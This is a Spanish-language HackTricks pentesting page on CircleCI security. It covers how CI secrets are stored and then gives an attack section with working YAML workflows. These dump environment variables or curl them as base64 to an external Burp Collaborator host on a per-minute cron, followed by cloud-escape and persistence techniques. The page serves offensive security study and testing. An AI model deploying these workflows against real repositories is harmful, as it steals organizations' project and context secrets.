# Seguridad en CircleCI

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci칩n B치sica

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) es una plataforma de Integraci칩n Continua donde puedes **definir plantillas** indicando lo que quieres que haga con alg칰n c칩digo y cu치ndo hacerlo. De esta manera, puedes **automatizar pruebas** o **despliegues** directamente **desde la rama master de tu repositorio**, por ejemplo.

## Permisos

**CircleCI** **hereda los permisos** de github y bitbucket relacionados con la **cuenta** que inicia sesi칩n.\
En mis pruebas comprob칠 que mientras tengas **permisos de escritura sobre el repositorio en github**, vas a poder **gestionar la configuraci칩n del proyecto en CircleCI** (establecer nuevas claves ssh, obtener claves de api del proyecto, crear nuevas ramas con nuevas configuraciones de CircleCI...).

Sin embargo, necesitas ser un **administrador del repositorio** para **convertir el repositorio en un proyecto de CircleCI**.

## Variables de Entorno y Secretos

Seg칰n [**la documentaci칩n**](https://circleci.com/docs/2.0/env-vars/) hay diferentes maneras de **cargar valores en variables de entorno** dentro de un flujo de trabajo.

### Variables de entorno integradas

Cada contenedor ejecutado por CircleCI siempre tendr치 [**variables de entorno espec칤ficas definidas en la documentaci칩n**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) como `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` o `CIRCLE_USERNAME`.

### Texto claro

Puedes declararlas en texto claro dentro de un **comando**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Puedes declararlos en texto claro dentro del **entorno de ejecuci칩n**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Puedes declararlos en texto claro dentro del **entorno de build-job**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Puedes declararlos en texto claro dentro del **entorno de un contenedor**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Secretos del Proyecto

Estos son **secretos** que solo ser치n **accesibles** por el **proyecto** (por **cualquier rama**).\
Puedes verlos **declarados en** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
La funcionalidad "**Importar Variables**" permite **importar variables de otros proyectos** a este.
{% endhint %}

### Secretos de Contexto

Estos son secretos que son **amplios en la organizaci칩n**. Por **defecto cualquier repositorio** podr치 **acceder a cualquier secreto** almacenado aqu칤:

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
Sin embargo, ten en cuenta que se puede **seleccionar un grupo diferente** (en lugar de Todos los miembros) para **dar acceso a los secretos solo a personas espec칤ficas**.\
Actualmente, esta es una de las mejores maneras de **aumentar la seguridad de los secretos**, para no permitir que todos accedan a ellos, sino solo algunas personas.
{% endhint %}

## Ataques

### Buscar Secretos en Texto Claro

Si tienes **acceso al VCS** (como github) revisa el archivo `.circleci/config.yml` de **cada repositorio en cada rama** y **busca** posibles **secretos en texto claro** almacenados all칤.

### Enumeraci칩n de Secretos de Env Vars & Contexto

Revisando el c칩digo puedes encontrar **todos los nombres de los secretos** que se est치n **usando** en cada archivo `.circleci/config.yml`. Tambi칠n puedes obtener los **nombres de los contextos** de esos archivos o revisarlos en la consola web: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Exfiltrar Secretos del Proyecto

{% hint style="warning" %}
Para **exfiltrar TODOS** los secretos del proyecto y del contexto **solo** necesitas tener acceso de **ESCRITURA** a **solo 1 repositorio** en toda la organizaci칩n de github (_y tu cuenta debe tener acceso a los contextos pero por defecto todos pueden acceder a cada contexto_).
{% endhint %}

{% hint style="danger" %}
La funcionalidad "**Importar Variables**" permite **importar variables de otros proyectos** a este. Por lo tanto, un atacante podr칤a **importar todas las variables del proyecto de todos los repositorios** y luego **exfiltrar todas juntas**.
{% endhint %}

Todos los secretos del proyecto siempre se establecen en el entorno de los trabajos, as칤 que simplemente llamando a env y ofusc치ndolo en base64 exfiltrar치s los secretos en la **consola de registro web de los flujos de trabajo**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Si **no tienes acceso a la consola web** pero tienes **acceso al repositorio** y sabes que se utiliza CircleCI, puedes simplemente **crear un flujo de trabajo** que se **active cada minuto** y que **extraiga los secretos hacia una direcci칩n externa**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Exfiltrar Secretos del Contexto

Necesitas **especificar el nombre del contexto** (esto tambi칠n exfiltrar치 los secretos del proyecto):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Si **no tienes acceso a la consola web** pero tienes **acceso al repositorio** y sabes que se utiliza CircleCI, puedes simplemente **modificar un flujo de trabajo** que se **activa cada minuto** y que **exfiltra los secretos a una direcci칩n externa**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Simplemente crear un nuevo `.circleci/config.yml` en un repositorio **no es suficiente para activar una construcci칩n de circleci**. Necesitas **habilitarlo como un proyecto en la consola de circleci**.
{% endhint %}

### Escape a la Nube

**CircleCI** te da la opci칩n de ejecutar **tus construcciones en sus m치quinas o en las tuyas**.\
Por defecto, sus m치quinas est치n ubicadas en GCP, y inicialmente no podr치s encontrar nada relevante. Sin embargo, si una v칤ctima est치 ejecutando las tareas en **sus propias m치quinas (potencialmente, en un entorno de nube)**, podr칤as encontrar un **punto final de metadatos de la nube con informaci칩n interesante en 칠l**.

Observa que en los ejemplos anteriores se lanz칩 todo dentro de un contenedor de docker, pero tambi칠n puedes **solicitar lanzar una m치quina VM** (que puede tener diferentes permisos en la nube):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
O incluso un contenedor docker con acceso a un servicio docker remoto:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Persistencia

* Es posible **crear tokens de usuario en CircleCI** para acceder a los puntos finales de la API con el acceso de los usuarios.
* _https://app.circleci.com/settings/user/tokens_
* Es posible **crear tokens de proyectos** para acceder al proyecto con los permisos otorgados al token.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Es posible **a침adir claves SSH** a los proyectos.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Es posible **crear un trabajo cron en una rama oculta** en un proyecto inesperado que est치 **filtrando** todas las variables de entorno **context env** todos los d칤as.
* O incluso crear en una rama / modificar un trabajo conocido que **filtrar치** todos los secretos del contexto y del **proyecto** todos los d칤as.
* Si eres propietario de github puedes **permitir orbs no verificados** y configurar uno en un trabajo como **puerta trasera**
* Puedes encontrar una **vulnerabilidad de inyecci칩n de comandos** en alguna tarea e **inyectar comandos** a trav칠s de un **secreto** modificando su valor

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
